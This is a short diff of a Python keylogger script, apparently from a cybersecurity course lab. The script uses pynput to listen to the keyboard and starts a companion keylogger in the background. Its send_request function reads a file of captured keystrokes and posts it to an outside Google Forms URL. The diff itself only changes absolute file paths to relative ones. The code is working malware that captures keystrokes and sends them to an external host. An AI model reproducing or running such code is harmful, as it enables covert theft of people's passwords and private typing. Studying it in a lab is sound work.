@@ -7,11 +7,11 @@ from pynput.keyboard import Listener
 
 startlog = time.time()
 
-os.system('python3 /home/kali/ITP270_FALL2022/Python_Scripting_Cyber_Range/Keylogger_Remote_Form/keyloggerRemoteTest.py &')
+os.system('python3 keyloggerRemote.py &')
 time.sleep(1)
 
 def send_request():
-	form_input = open("/home/kali/ITP270_FALL2022/Python_Scripting_Cyber_Range/Keylogger_Remote_Form/keyboard_Input.txt")
+	form_input = open("keyboard_Input.txt")
 	form_send = form_input.read()
 	url = 'https://docs.google.com/forms/u/1/d/e/1FAIpQLSf9WQu4b2ZbgLPFHusSGuI-2W3LE3FfSPHqxxMdqqYXTg3r8w/formResponse'
 	form_data = {'entry.839337160':'This is a test'}
